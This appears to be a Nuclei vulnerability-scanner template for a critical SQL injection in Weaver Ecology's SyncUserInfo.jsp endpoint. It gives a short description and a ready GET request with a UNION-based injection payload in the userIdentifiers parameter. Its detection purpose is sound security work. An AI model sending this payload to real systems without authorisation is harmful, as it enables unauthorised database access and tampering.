# Nuclei Template: Ecology Syncuserinfo - SQL Injection
**Template ID:** ecology-syncuserinfo-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`ecology-syncuserinfo-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
```

## References
- https://www.weaver.com.cn/
- https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml
